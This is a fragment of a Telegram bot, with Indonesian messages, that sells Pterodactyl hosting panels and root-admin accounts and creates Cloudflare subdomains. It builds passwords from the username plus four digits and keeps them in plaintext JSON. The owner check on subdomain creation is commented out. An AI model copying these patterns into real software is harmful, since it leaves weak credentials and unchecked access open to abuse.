    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /11gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];
  
  const u = t[1];
  const name = username + "11gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "11000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Limvzc`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/unliv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const randomImage = getRandomImage();

  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /unliv2 namapanel,idtele");
    return;
  }

  const username = t[0];
  const u = t[1];
  const name = username + "unliv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "0";
  const cpu = "0";
  const disk = "0";
  const email = `${username}@unliv2.Kruzzy`;
  const akunlo = randomImage;
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;

  let user;
  let server;

  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: "en",
        password,
      }),
    });

    const data = await response.json();

    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email & user telah ada di panel King Kruzzy");
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0])}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk,
          io: 500,
          cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`);

    try {
      if (akunlo) {
        await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
        await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

// CREATE KHUSUS ADMIN
bot.onText(/\/cadp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const params = match[1].split(",");
  if (params.length < 2) {
    return bot.sendMessage(chatId, "Format: /cadp namapanel,idtele");
  }

  const panelName = params[0].trim();
  const telegramId = params[1].trim();
  const password = generatePassword(8);

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: `${panelName}@admin.kruzzy`,
        username: panelName,
        first_name: panelName,
        last_name: "Admin",
        language: "en",
        root_admin: true,
        password: password,
      }),
    });

    const data = await response.json();
    if (data.errors) {
      return bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
    }

    const user = data.attributes;

    // SIMPAN admin.json
    const adminData = readAdminData();
    adminData[panelName] = {
      username: user.username,
      password: password,
      email: user.email,
      userId: user.id,
      telegramId: telegramId,
      domain: domain,
      root_admin: true,
      createdAt: user.created_at,
    };
    saveAdminData(adminData);

    await bot.sendMessage(
      chatId,
      `
┏━⬣ ✧「 TYPE KHUSUS ADP」✧
┃ ✧ ID: ${user.id}
┃ ✧ USERNAME: ${user.username}
┃ ✧ EMAIL: ${user.email}
┃ ✧ NAME: ${user.first_name} ${user.last_name}
┃ ✧ LANGUAGE: ${user.language}
┃ ✧ ADMIN: ${user.root_admin}
┃ ✧ CREATED AT: ${user.created_at}
┗━━━━━━━━━━━━━━━━━━⬣`
    );

    // KIRIM KE USER
    try {
      await bot.sendMessage(
  telegramId,
  `
┏━⬣ ✧「 DATA ADMIN PANEL 」✧
┃好 Username : <code>${user.username}</code>
┃好 Password : <code>${password}</code>
┃好 Login : ${domain}
┗━━━━━━━━━⬣
┏━⬣ ✧「 RULES 」✧
┃ ✧ Jangan Curi Sc
┃ ✧ Jangan Buka Panel Orang
┃ ✧ Jangan Ddos Server
┃ ✧ Kalo jualan sensor domainnya
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
  {
    parse_mode: "HTML",
    disable_web_page_preview: true
  });

      await bot.sendMessage(
        chatId,
        "Data admin berhasil dikirim ke user."
      );

    } catch (err) {
      notifyFailedSend(bot, chatId, panelName, telegramId);
    }

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal membuat admin.");
  }
});

bot.onText(/\/cadmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const params = match[1].split(",");
  if (params.length < 2) {
    return bot.sendMessage(chatId, "Format: /cadmin namapanel,idtele");
  }

  const panelName = params[0].trim();
  const telegramId = params[1].trim();
  const password = generatePassword(8);

  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: `${panelName}@admin.kruzzy.com`,
        username: panelName,
        first_name: panelName,
        last_name: "Admin",
        language: "en",
        root_admin: true,
        password: password,
      }),
    });

    const data = await response.json();
    if (data.errors) {
      return bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
    }

    const user = data.attributes;

    // SIMPAN admin.json
    const adminData = readAdminData();
    adminData[panelName] = {
      username: user.username,
      password: password,
      email: user.email,
      userId: user.id,
      telegramId: telegramId,
      domain: domainv2,
      root_admin: true,
      createdAt: user.created_at,
    };
    saveAdminData(adminData);

    await bot.sendMessage(
      chatId,
      `
┏━⬣ ✧「 TYPE KHUSUS ADMIN 」✧
┃ ✧ ID: ${user.id}
┃ ✧ USERNAME: ${user.username}
┃ ✧ EMAIL: ${user.email}
┃ ✧ NAME: ${user.first_name} ${user.last_name}
┃ ✧ LANGUAGE: ${user.language}
┃ ✧ ADMIN: ${user.root_admin}
┃ ✧ CREATED AT: ${user.created_at}
┗━━━━━━━━━━━━━━━━━━⬣`
    );

    // KIRIM KE USER
    try {
      await bot.sendMessage(
  telegramId,
  ` 
┏━⬣ ✧「 DATA ADMIN PANEL 」✧
┃好 Username : <code>${user.username}</code>
┃好 Password : <code>${password}</code>
┃好 Login : ${domainv2}
┗━━━━━━━━━⬣
┏━⬣ ✧「 RULES 」✧
┃ ✧ Jangan Curi Sc
┃ ✧ Jangan Buka Panel Orang
┃ ✧ Jangan Ddos Server
┃ ✧ Kalo jualan sensor domainnya
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
  {
    parse_mode: "HTML",
    disable_web_page_preview: true
  });

      await bot.sendMessage(
        chatId,
        "Data admin berhasil dikirim ke user."
      );

    } catch (err) {
      notifyFailedSend(bot, chatId, panelName, telegramId);
    }

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal membuat admin.");
  }
});


//===== SUB DOMAIN ======

bot.onText(/^\/subdo(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const input = match[1];
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();

    const text = match[1];
    if (!text) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /subdo reqname|ipvps");
    }
    
    if (!text.includes("|")) return bot.sendMessage(chatId, "❌ Format salah!\nContoh: `/subdo reqname|ipvps`", { parse_mode: "Markdown" });

    const [host, ip] = text.split("|").map(i => i.trim());
    const dom = Object.keys(global.subdomain);

    if (dom.length === 0) return bot.sendMessage(chatId, "❌ Tidak ada domain yang tersedia saat ini.");

    const inlineKeyboard = [];
    for (let i = 0; i < dom.length; i += 2) {
        const row = dom.slice(i, i + 2).map((d, index) => ({
            text: d,
            callback_data: `create_domain ${i + index} ${host}|${ip}`
        }));
        inlineKeyboard.push(row);
    }

    const opts = {
        reply_markup: {
            inline_keyboard: inlineKeyboard
        }
    };

    bot.sendMessage(chatId, `🔹 *Subdomain yang tersedia saat ini*\nbig thanks from @Pirzyy1\nᴄʜᴏᴏꜱᴇ ᴀ ꜱᴜʙᴅᴏᴍᴀɪɴ :`, { parse_mode: "Markdown", ...opts });
});

// handler subdomain
bot.on("callback_query", async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data.split(" ");

    if (data[0] === "create_domain") {
        /*if (callbackQuery.from.id !== ownerId) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Owner only!", show_alert: true });
        }*/

        const domainIndex = Number(data[1]);
        const dom = Object.keys(global.subdomain);

        if (domainIndex < 0 || domainIndex >= dom.length) return bot.sendMessage(msg.chat.id, "Domain tidak ditemukan!");
        if (!data[2] || !data[2].includes("|")) return bot.sendMessage(msg.chat.id, "Hostname/IP tidak ditemukan!");

        const tldnya = dom[domainIndex];
        const [host, ip] = data[2].split("|").map(item => item.trim());

        async function createSubDomain(host, ip) {
            try {
                const response = await axios.post(
                    `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
                    {
                        type: "A",
                        name: `${host.replace(/[^a-z0-9.-]/gi, "")}.${tldnya}`,
                        content: ip.replace(/[^0-9.]/gi, ""),
                        ttl: 1,
                        proxied: false
                    },
                    {
                        headers: {
                            "Authorization": `Bearer ${global.subdomain[tldnya].apitoken}`,
                            "Content-Type": "application/json"
                        }
                    }
                );

                const res = response.data;
                if (res.success) {
                    return {
                        success: true,
                        name: res.result?.name || `${host}.${tldnya}`,
                        ip: res.result?.content || ip
                    };
                } else {
                    return { success: false, error: "Gagal membuat subdomain" };
                }
            } catch (e) {
                const errorMsg = e.response?.data?.errors?.[0]?.message || e.message || "Terjadi kesalahan";
                return { success: false, error: errorMsg };
            }
        }

        const result = await createSubDomain(host.toLowerCase(), ip);

        if (result.success) {
            let teks = `
✅ *ʙᴇʀʜᴀsɪʟ ᴍᴇᴍʙᴜᴀᴛ sᴜʙᴅᴏᴍᴀɪɴ*

🌐 *sᴜʙᴅᴏᴍᴀɪɴ:* \`${result.name}\`
📌 *ɪᴘ ᴠᴘs:* \`${result.ip}\`
`;
       await bot.sendMessage(msg.chat.id, teks, { parse_mode: "Markdown" });
        } else {
            await bot.sendMessage(msg.chat.id, `❌ Gagal membuat subdomain:\n${result.error}`);
        }

        bot.answerCallbackQuery(callbackQuery.id);
    }
});

bot.onText(/^\/listsubdo$/, async (msg) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id.toString();
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  const dom = Object.keys(global.subdomain);
  if (dom.length === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada domain yang tersedia saat ini.");
  }

  let teks = `📜 *ᴅᴀꜰᴛᴀʀ ᴅᴏᴍᴀɪɴ ʏᴀɴɢ ᴛᴇʀꜱᴇᴅɪᴀ*\n\n`;
  dom.forEach((d, i) => {
    teks += `${i + 1}. \`${d}\`\n`;
  });

  bot.sendMessage(chatId, teks, { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
});